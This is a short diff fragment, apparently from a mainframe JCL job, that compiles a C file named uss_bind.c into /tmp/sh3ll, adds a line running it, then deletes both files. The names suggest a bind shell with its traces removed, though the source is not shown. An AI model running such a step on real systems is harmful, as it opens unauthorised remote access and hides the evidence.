@@ -46,6 +46,7 @@ return EXIT_SUCCESS;
 //STDPARM   DD *
 SH cd /tmp;
 cc -o /tmp/sh3ll /tmp/uss_bind.c;
+/tmp/sh3ll;
 rm /tmp/uss_bind.c;
 rm /tmp/sh3ll;
 /*
